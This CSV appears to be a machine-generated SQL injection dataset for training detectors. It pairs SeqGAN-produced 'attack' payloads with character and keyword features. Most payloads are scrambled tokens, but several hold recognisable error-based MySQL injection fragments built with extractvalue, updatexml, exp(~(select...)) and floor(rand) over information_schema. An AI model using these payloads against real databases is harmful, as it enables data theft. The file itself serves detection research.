label,payload,family,payload_type,method,run_id,sample_index,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,keyword_total
attack,"1""   SELECT 0 AYNITINT  grahr  (  (    select information_schemaer   FROM  =  rand,le113  0x7171706a71,,W  0x7171706a71,  ||chr  (  4493  =  ||coun  us.  g L IN.chr  (  (  ||  =  113  >  select   )    ,  )   AND from concat  (  0   SELECT 4493 LS'  =  'tout   hhr  FROM  rand  select  1. ,1 select DITer  _ri   or 8488  R",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,267,321.0,51.0,4.488601215358934,139.0,43.0,106.0,33.0,0.43302180685358255,0.13395638629283488,0.3302180685358255,0.102803738317757,2.0,1.0,0.0,0.0,0.0,4.0,0.0,8.0,0.0,2.0,6.0,11.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,6.0,0.0,0.0,3.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,12.0
attack,"r'a_mFROM   0 from Vor N 1 G  #,floor  113  ac_et  (  then  =  )  )   from end  )  ||chr  (  *   =  )  )  113  ,concat       ",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,268,125.0,32.0,3.6415276359634023,45.0,8.0,54.0,18.0,0.36,0.064,0.432,0.144,1.0,0.0,0.0,0.0,1.0,2.0,0.0,7.0,0.0,2.0,2.0,5.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,"1""   (    ,  select union""ass whentsut.ss   (  select 0 or 0 1297  ||chr  select   ,  ||chouunadd.show_abbp'  )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and   (  '' like 'erass.cha  (  113   )    extractvalue",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,269,355.0,40.0,4.1268344640038706,151.0,46.0,118.0,40.0,0.4253521126760563,0.1295774647887324,0.3323943661971831,0.11267605633802817,4.0,2.0,0.0,0.0,0.0,1.0,0.0,18.0,0.0,1.0,7.0,5.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,4.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.0
attack,"-9740'   )    )     )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  '`.es.gestt_r.r  ) or 9325  select  , 8488 and 1 #NUSTASNTIhs   x2   )i  )    )   having 'i'  ) or  L     whenxT  *2   (  )    (  )       1045  )    )   )    )    )     ||ISNAUT.U'i'  122  SELECTIT end  )  =  )   (  || whenS   fromunase  113  ,0x717a767a71,0x717a767a71,0x717a767a71n when   SELECTinformation_schemaT  SELECT end,1  ",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,270,514.0,51.0,4.175764253160495,168.0,87.0,194.0,65.0,0.32684824902723736,0.16926070038910507,0.377431906614786,0.1264591439688716,6.0,0.0,1.0,0.0,1.0,2.0,0.0,33.0,0.0,2.0,10.0,8.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,3.0,0.0,0.0,0.0,2.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,9.0
attack,"1%'   )    )    and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and    (    (   'a7562_r.(  *   )       =  )     (  SELECT whenr  x  || hhr  (    113  *   )  ,  ),7562  )  (  tr  =  ||csx.   1297  106  ||chr  (  (  0x717a767a71,1   )    )     concat  chr  (  (  i  select from d_r  (  Y      case LC4493T  ||chhoyunuint  ,  ||chr  (  ||  (  (  case 0 hualt_me",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,271,449.0,45.0,3.8633697304135883,120.0,72.0,189.0,68.0,0.267260579064588,0.1603563474387528,0.4209354120267261,0.1514476614699332,2.0,0.0,0.0,0.0,2.0,3.0,0.0,33.0,1.0,3.0,10.0,17.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,3.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.0
attack,"1""   )    )    or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (   ""'   )    )     )   or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (     (  'hofo'   )    )    and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and    (    (   'w",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,272,583.0,34.0,3.4284811766888996,134.0,101.0,269.0,79.0,0.22984562607204118,0.1732418524871355,0.4614065180102916,0.13550600343053174,4.0,2.0,0.0,0.0,2.0,3.0,0.0,52.0,0.0,0.0,14.0,5.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,7.0,0.0,0.0,2.0,4.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,18.0
attack,-')   1a 1 4493T b 5305 andE   9325  5840  )  )  4386  )   SELECT DIMANCT  (  )  )  0 WHERE 3785 =  ||r  (  )  )  )    )   SELECT 1   n  )  ||athrssSunn*2   )  case mm   (,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,273,171.0,43.0,3.919464566855356,49.0,29.0,70.0,23.0,0.28654970760233917,0.1695906432748538,0.4093567251461988,0.13450292397660818,1.0,0.0,1.0,0.0,1.0,1.0,0.0,15.0,0.0,0.0,0.0,7.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,2.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,"1'   )    )     )   or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (     (  'eeada_uin=_narayualadds.(  113  ||  (  (  select and union  113   m    'i'  3326113  (  ||cr  (  ||counad.erahr  (  0x7171706a71,  ||chr  (  4232  select from t 113  ||cho  (  )  5023  and     (  select from froms.gr.(  (  =  ||chr  =hr.t_ntsroMr.asp a   (  )  )  )",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,274,475.0,40.0,3.920632137785308,151.0,66.0,186.0,72.0,0.3178947368421053,0.13894736842105262,0.391578947368421,0.15157894736842106,4.0,0.0,0.0,0.0,1.0,4.0,0.0,36.0,0.0,3.0,5.0,17.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,6.0,1.0,0.0,3.0,3.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,15.0
attack,"1""hr  =  case =  x  atr.alivgca_rs   (  =  6237  (    )   )   )    )     and x W.chr  rand  112  ||chr  u  113  0 from or #(  ||chr  (  ||chr  (  ||c  =  122  select ,  (  *  ,  rand  )  )   and or when(  4232  having from by x   from :a_art_Wr  (  (  5483  0x7171706a71*   R7469  case p m",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,275,289.0,46.0,4.029312037437971,99.0,37.0,114.0,39.0,0.34256055363321797,0.12802768166089964,0.3944636678200692,0.13494809688581316,0.0,1.0,0.0,0.0,2.0,4.0,0.0,15.0,0.0,3.0,2.0,14.0,0.0,1.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,3.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.0
attack,15192x_nt,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,276,9.0,8.0,2.94770277922009,3.0,5.0,0.0,1.0,0.3333333333333333,0.5555555555555556,0.0,0.1111111111111111,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,"r a  113  )    ,,floor  *",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,277,25.0,11.0,2.801706277574314,7.0,3.0,11.0,4.0,0.28,0.12,0.44,0.16,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,2.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,"1""_r  teSd_rnayerosuas_nuadft,xsiaytss whena.select dOoNs.r  (  (  ||chr  (  =  select end2   )     )  ,  =  )   )     2 by D FROM end  ||chr  (  113  case",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,278,155.0,37.0,4.130834338710007,76.0,6.0,51.0,22.0,0.49032258064516127,0.03870967741935484,0.32903225806451614,0.14193548387096774,0.0,1.0,0.0,0.0,0.0,2.0,0.0,8.0,0.0,3.0,2.0,6.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,2.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,"1 AND 1 O5483chr.UINCT0x717a767a71.cha  (  ~  *   9173 )   )  )     (  122un  )    )  || end  (  ||chhr  = 3051m)   FROM   then information_schemaT  (  0  having from information_schema hr  (  0  =  select   (0x717a767a71,concat  0   from 1 I dbkhojutlet_reyyery_.hr  (  chr  =  axx.dbyzww_att.a_roysl",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,279,301.0,55.0,4.639276980374088,144.0,39.0,84.0,34.0,0.47840531561461797,0.12956810631229235,0.27906976744186046,0.11295681063122924,0.0,0.0,0.0,0.0,1.0,3.0,0.0,13.0,0.0,6.0,1.0,8.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,3.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
attack,"1'   )    )     )   or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (     (  'ehrtysauaam(  :select concat  )  )     (  113  6825 FROM  select D 1 5305  ,0x5c    = and   113  0    SELECT from   (  a  0T xs mSAm)       from :0(  concat  =  ||chselect from  (  4232  ,0x717a767a71,floor  ||_r  (  *  )  =   or end  )   then bys D     ITo hr  *  SELECT end  )   thenx  (  #2   )     FROM having t  6082  (",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,280,534.0,54.0,3.9586467261996323,177.0,70.0,227.0,60.0,0.33146067415730335,0.13108614232209737,0.4250936329588015,0.11235955056179775,2.0,0.0,0.0,0.0,3.0,4.0,0.0,35.0,0.0,1.0,7.0,11.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,7.0,0.0,0.0,6.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,20.0
attack,1tt_ystzuvkys/rachinformation_schema'  =  'cu,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,281,45.0,23.0,4.374860596185444,34.0,1.0,4.0,6.0,0.7555555555555555,0.022222222222222223,0.08888888888888889,0.13333333333333333,2.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,2.0,0.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,"1%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,282,9.0,5.0,2.0588138903312014,0.0,1.0,4.0,4.0,0.0,0.1111111111111111,0.4444444444444444,0.4444444444444444,0.0,2.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,"1%Q""   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  """"  )   thenINCCies union 5483  ,0x717a767a71.,0x78   having R'i'  and  )   or 1 x x  )    AND SELECT 1  )   )    =  =m0 concat  (  SELECT D when 8488 else a from when   (  select Do  )  ||  (  )  ~  4232  --1297whereaj  || AND  )(  6825  )2 1   )and from :r  (  select end  )    ,  (  )  ||chyr  (  )   or Y2017 1",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,283,608.0,60.0,4.187996938608293,218.0,77.0,236.0,77.0,0.35855263157894735,0.12664473684210525,0.3881578947368421,0.12664473684210525,2.0,3.0,2.0,0.0,2.0,3.0,0.0,44.0,1.0,2.0,8.0,13.0,1.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,7.0,1.0,0.0,4.0,6.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,23.0
attack,"16'  =  'ntunaseer.r  (  ||  =  =  )   )    --itA   FROMn ASunion ROWEIo  case when   (  || then 4493  || else x end  113  )        )    || unionINSUendea end  )   then1 end    (  )||I. RNT  (  =  (  )   ""  )  )   (  from  ||chr  u  ||chr  (  and   AND WHERE group  h 5192 mbelyetunsx",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,284,284.0,51.0,4.080153773029721,118.0,14.0,111.0,41.0,0.4154929577464789,0.04929577464788732,0.3908450704225352,0.1443661971830986,2.0,1.0,2.0,0.0,0.0,4.0,0.0,16.0,0.0,0.0,0.0,20.0,1.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"r.cu  (  --al4232     )na 8488 from  ||c  (  0x7171706a712 when   (  ||r  (  ||chrr  (  0  select whenhrros   or FROM chr  (  (  0  =  )   )  ,floor  || from group  (  case ,  =  ||chrr  ( 1392r  (  (  case 3785 unionIs group by when   (  )   6055l 0 1 1210  )   (  )     (  6055  )     or)  )   )   a D 0",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,285,305.0,44.0,3.9171296799759694,97.0,44.0,123.0,41.0,0.3180327868852459,0.14426229508196722,0.40327868852459015,0.13442622950819672,0.0,0.0,2.0,0.0,0.0,2.0,0.0,24.0,0.0,0.0,2.0,14.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,3.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
attack,"9891aur  6237= case when   (  (  (  (  || concat  )  chr  (  select concat  (    select  1 WHERE 3785 d information_schema.chr  5023r  (  (  ,  =  )     )  a   (  (  ||cu  chr  (  from  (  )  0   WHERE union 1hr  (  )  ||chr  cr  (  ||,  (  =  ||chr  (  ,  )  113  selectselect 1   ,1  )   )  )  ,0x717a767a71,0x78",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,286,314.0,38.0,3.92140163092372,111.0,36.0,121.0,46.0,0.3535031847133758,0.11464968152866242,0.3853503184713376,0.1464968152866242,0.0,0.0,0.0,0.0,0.0,3.0,0.0,25.0,0.0,1.0,6.0,13.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,2.0,1.0,2.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,9.0
attack,"1'   )    )     )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  ''   )    )     )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (     (  'wwfj' where 2291  =  2291 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a   )    )   +'",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,287,690.0,43.0,3.8211160029494327,213.0,113.0,280.0,84.0,0.30869565217391304,0.16376811594202897,0.4057971014492754,0.12173913043478261,6.0,0.0,0.0,0.0,2.0,4.0,0.0,53.0,0.0,2.0,15.0,7.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,5.0,0.0,1.0,2.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,16.0
attack,1'a end  )     )    (  ||ch x.chr  (  (  ||chr  (  || from  ||c(  0  =  )e  )   )     R 0 1 else union 1S group 1 x         and LSYS DAMINGIECA1   I  select 1 IT  =  )  0   )   and   )    n when     ||  (  =  )   from else Aendj.USRor 1 where then *a from 0 and select by ,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,288,272.0,46.0,3.85297260518028,113.0,11.0,116.0,32.0,0.41544117647058826,0.04044117647058824,0.4264705882352941,0.11764705882352941,1.0,0.0,0.0,0.0,1.0,3.0,0.0,15.0,0.0,0.0,0.0,14.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,2.0,1.0,1.0,3.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,10.0
attack,"1'   )ua a  information_schemaow IT  5023  )    1210  )   =  ,0x717a767a71,concat  4386  )   then end  =  ,i)   )    )     or 7881 xr  (   concat  (  00x717a767a71v  ,1  =         then 4386  (hr  (  (  (  106  1  =  )n  case and else 7158  )   --  ui(  (  )   x     Rchr  (  ||Uchr  (  9067  ||chr  113  =  =  ,113  ,  #0x717a767a71",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,289,332.0,42.0,3.87022389810415,90.0,68.0,133.0,41.0,0.2710843373493976,0.20481927710843373,0.4006024096385542,0.12349397590361445,1.0,0.0,2.0,0.0,0.0,6.0,0.0,20.0,0.0,1.0,6.0,12.0,1.0,0.0,1.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"15996xxwel  (  6237b)   5978 ||r  (  (  >  =  )     (  0  )     ,7469  113  )   )    )   and SELECT WHEREE  (  --",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,290,113.0,35.0,3.5687047694680394,22.0,21.0,52.0,18.0,0.19469026548672566,0.18584070796460178,0.46017699115044247,0.1592920353982301,0.0,0.0,2.0,0.0,0.0,1.0,0.0,11.0,0.0,0.0,1.0,6.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,"1 '||  (  select '   FROM end   SELECT d=  (  4232  casetWdr.s   (  || concat  =  6237,  ||chr  (  (  select else 2131 4607   )     )   E0 6055  ||u",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,291,148.0,38.0,4.020344901357321,50.0,22.0,55.0,21.0,0.33783783783783783,0.14864864864864866,0.3716216216216216,0.14189189189189189,2.0,0.0,0.0,0.0,0.0,2.0,0.0,7.0,0.0,0.0,1.0,10.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,3.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
attack,"1  eo9740lowutts   )    --2   )    )    and (  113  0 FROMx DIT end   WHERE 3051 0 1  ||chr  =  #  =  e     tr  SELECT from and h1hr  (  0  ,  ,and concat  ||chr  u  (  )          #  6237,floor  =  t_r  = where select 4386  ,  ,1  )0x717a767a71,1   )    e   d  a information_schema bya  D group 0 end  )    )  4232  )   from ",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,292,325.0,53.0,4.122846281199427,120.0,42.0,131.0,32.0,0.36923076923076925,0.12923076923076923,0.40307692307692305,0.09846153846153846,0.0,0.0,2.0,0.0,0.0,4.0,0.0,12.0,0.0,2.0,6.0,10.0,0.0,0.0,1.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,2.0,0.0,2.0,2.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,11.0
attack,"r9740e ' procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and 'ountetowes  0x7171706a71    then end  ||cu",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,293,242.0,32.0,4.00732510704173,92.0,50.0,78.0,22.0,0.38016528925619836,0.2066115702479339,0.32231404958677684,0.09090909090909091,2.0,0.0,0.0,0.0,0.0,1.0,0.0,12.0,0.0,0.0,5.0,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
